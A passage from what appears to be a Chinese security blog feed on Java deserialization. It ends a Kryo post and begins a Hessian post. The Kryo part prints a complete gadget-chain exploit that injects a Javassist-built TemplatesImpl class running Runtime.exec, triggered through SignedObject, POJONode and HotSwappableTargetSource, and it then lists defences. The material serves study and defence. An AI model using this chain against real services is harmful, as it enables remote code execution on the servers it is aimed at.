class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> kryo.readClassAndObject(input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按理来说应该是可以触发的，但是设置了<br><code>new StdInstantiatorStrategy()</code><br>反序列化的create方法会把TiedMapEntry中的map变量名认成是value<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/10.png" alt><br>导致无法利用</p><h3 id="equals"><a href="#equals" class="headerlink" title="equals"></a>equals</h3><p>首先要触发到equals必须要有两个元素（node），而且该元素必须是同一类的，来看看HashMap的putVal源码看看为什么<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11.png" alt><br>如果两个类都不是同一个类，就会直接进入到该if当中，而不会执行下面的equals。<br>接下来看看具体的代码</p><h4 id="HotSwappableTargetSource"><a href="#HotSwappableTargetSource" class="headerlink" title="HotSwappableTargetSource"></a>HotSwappableTargetSource</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.Kryo;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Input;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Output;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> javassist.CtNewConstructor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.objenesis.strategy.StdInstantiatorStrategy;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.integration.codec.CodecMessageConverter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.integration.codec.kryo.MessageCodec;</span><br><span class="line"><span class="keyword">import</span> org.springframework.messaging.Message;</span><br><span class="line"><span class="keyword">import</span> org.springframework.messaging.MessageHeaders;</span><br><span class="line"><span class="keyword">import</span> org.springframework.messaging.support.GenericMessage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line"></span><br><span class="line">        kryo.setRegistrationRequired(<span class="literal">false</span>);</span><br><span class="line">        kryo.setInstantiatorStrategy(<span class="keyword">new</span> <span class="title class_">StdInstantiatorStrategy</span>());</span><br><span class="line">        <span class="comment">// 二次反序列化</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;EvilGeneratedByJavassist&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">ctConstructor</span> <span class="operator">=</span> CtNewConstructor.make(<span class="string">&quot;public EvilGeneratedByJavassist()&#123;Runtime.getRuntime().exec(\&quot;open -a calculator\&quot;);&#125;&quot;</span>, ctClass);</span><br><span class="line">        ctClass.addConstructor(ctConstructor);</span><br><span class="line">        <span class="type">byte</span>[] byteCode = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;whatever&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;byteCode&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">pojoNode1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templates);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 初始化 SignedObject</span></span><br><span class="line">        KeyPairGenerator keyPairGenerator;</span><br><span class="line">        keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        <span class="comment">// 设置二次反序列化入口</span></span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(pojoNode1, privateKey, signingEngine);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 一次反序列化</span></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">pojoNode2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(signedObject);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(pojoNode2);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;s&quot;</span>));</span><br><span class="line">        <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        setFieldValue(hashMap, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, h1, h1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, h2, h2, <span class="literal">null</span>));</span><br><span class="line">        setFieldValue(hashMap, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line"></span><br><span class="line">        <span class="type">Output</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        kryo.writeClassAndObject(s,hashMap);</span><br><span class="line">        s.close();</span><br><span class="line">        <span class="type">Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Input</span>(Files.newInputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> kryo.readClassAndObject(input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用链是<br><code>HotSwappableTargetSource.equals-&gt;XString.equals-&gt;POJONode.toString-&gt;SignedObject.getObject-&gt;POJONode.toString-&gt;getOutputProperties</code><br>可能有人会好奇为什么要绕一大圈调用两个POJONode.toString才能执行，直接调用最后那个不就行了吗，但是kryo默认是不反序列化transient字段的<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/13.png" alt><br>所以_tfactory是不会被反序列化的，这样导致POJONode调用getter方法的时候会报错，导致执行不了getOutputProperties</p><h2 id="Kryo反序列化Javabean"><a href="#Kryo反序列化Javabean" class="headerlink" title="Kryo反序列化Javabean"></a>Kryo反序列化Javabean</h2><p>上面的反序列化都是默认去调用FieldSerializer<br>但是还有很多其他类型的Serializer，都继承Serializer<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/14.png" alt><br>这里面第一个就引起了我的注意，很多反序列化链都是通过调用一些JavaBean去触发一些操作的<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/15.png" alt><br>看到简介，如何使用该Serializer<br>这里我直接给出简单的demo<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line"></span><br><span class="line">        kryo.register(MyClass.class,<span class="keyword">new</span> <span class="title class_">BeanSerializer</span>(kryo, MyClass.class));</span><br><span class="line"></span><br><span class="line">        <span class="type">MyClass</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line">        s.setNum(<span class="number">10</span>);</span><br><span class="line">        s.setHello(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        kryo.writeObject(output,s);</span><br><span class="line">        output.close();</span><br><span class="line">        <span class="type">Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Input</span>(Files.newInputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> kryo.readObject(input, MyClass.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="read-and-write"><a href="#read-and-write" class="headerlink" title="read and write"></a>read and write</h3><p>先来看看源码<br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/16.png" alt><br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/17.png" alt><br>可以发现两个函数都有个<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">property.get</span><br><span class="line">property.set</span><br></pre></td></tr></table></figure><br><img src="/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/18.png" alt><br>这些就会触发该类的Bean方法<br>那么其他操作就应该类似于Fastjson里面的那些类了，这里就不在过多叙述了</p><h2 id="kryo的防护"><a href="#kryo的防护" class="headerlink" title="kryo的防护"></a>kryo的防护</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kryo.setRegistrationRequired(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>当使用如上代码，那么所有反序列化的类都必须要被注册，才会被反序列化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kryo.addDefaultSerializer(Class,Serializer)</span><br></pre></td></tr></table></figure><p>当使用上面的代码，可以增加自己的Serializer，自己实现serializer的时候增加相应的黑名单即可</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://boogipop.com/2023/06/26/%E4%BB%8ECISCN%E8%A5%BF%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9B%E5%AD%A6%E4%B9%A0Kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://boogipop.com/2023/06/26/%E4%BB%8ECISCN%E8%A5%BF%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9B%E5%AD%A6%E4%B9%A0Kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></li><li><a href="https://github.com/p4d0rn/Java_Zoo/blob/2766f312d34c1267fee76c6e1a749d657d412c69/Deserial/Kryo.md">https://github.com/p4d0rn/Java_Zoo/blob/2766f312d34c1267fee76c6e1a749d657d412c69/Deserial/Kryo.md</a></li><li><a href="https://github.com/p4d0rn/Java_Zoo/blob/2766f312d34c1267fee76c6e1a749d657d412c69/CTF/seacloud.md">https://github.com/p4d0rn/Java_Zoo/blob/2766f312d34c1267fee76c6e1a749d657d412c69/CTF/seacloud.md</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;入门kryo&quot;&gt;&lt;a href=&quot;#入门kryo&quot; class=&quot;headerlink&quot; title=&quot;入门kryo&quot;&gt;&lt;/a&gt;入门kryo&lt;/h2&gt;&lt;h3 id=&quot;Demo&quot;&gt;&lt;a href=&quot;#Demo&quot; class=&quot;headerlink&quot; title=&quot;Demo&quot;&gt;&lt;/a&gt;Demo&lt;/h3&gt;&lt;p&gt;首先看个简单的demo&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="kryo" scheme="http://example.com/tags/kryo/"/>
    
  </entry>
  
  <entry>
    <title>hessian反序列化</title>
    <link href="http://example.com/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2023-09-07T15:17:04.000Z</published>
    <updated>2023-09-13T05:28:41.684Z</updated>
    
    <content type="html"><![CDATA[<h2 id="入门Hessian反序列化"><a href="#入门Hessian反序列化" class="headerlink" title="入门Hessian反序列化"></a>入门Hessian反序列化</h2><span id="more"></span><h3 id="People"><a href="#People" class="headerlink" title="People"></a>People</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">People</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student getId call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student setId call&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student getName call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student setName call&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Student"><a href="#Student" class="headerlink" title="Student"></a>Student</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">People</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="number">111</span>, <span class="string">&quot;xxx&quot;</span>, <span class="string">&quot;ggg&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> String gender;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, Class&lt;Object&gt;&gt; innerMap;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Student&gt; friends;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setFriends</span><span class="params">(List&lt;Student&gt; friends)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student setFriends call&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.friends = friends;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getFriends</span><span class="params">(List&lt;Student&gt; friends)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student getFriends call&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.friends = friends;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Map <span class="title function_">getInnerMap</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student getInnerMap call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> innerMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setInnerMap</span><span class="params">(Map innerMap)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student setInnerMap call&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.innerMap = innerMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getGender</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student getGender call&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> gender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setGender</span><span class="params">(String gender)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student setGender call&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.gender = gender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student default constructor call&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(<span class="type">int</span> id, String name, String gender)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student custom constructor call&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.gender = gender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ObjectInputStream)</span> &#123;</span><br><span class="line">        System.out.println(<span 